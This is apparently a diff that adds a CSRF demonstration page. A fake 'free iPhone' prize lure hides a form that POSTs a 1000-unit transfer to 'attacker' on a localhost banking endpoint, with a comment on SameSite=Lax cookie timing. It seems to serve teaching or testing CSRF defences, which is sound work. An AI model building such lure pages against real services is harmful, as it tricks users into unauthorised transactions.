@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Congratulations!</title>
+</head>
+<body>
+    <h1>You won a free iPhone! 🎉</h1>
+    <p>Click the button below to claim your prize.</p>
+
+    <!-- Sends a POST request with top level navigation. Will work if cookie is set to 
+    LAX and was created < 2 mins. -->
+    <form id="csrfForm" action="http://localhost:3000/transfer" method="POST">
+        <input type="hidden" name="recipient" value="attacker">
+        <input type="hidden" name="amount" value="1000">
+        <button type="submit">Claim Your Prize</button>
+    </form>
+</body>
+</html>
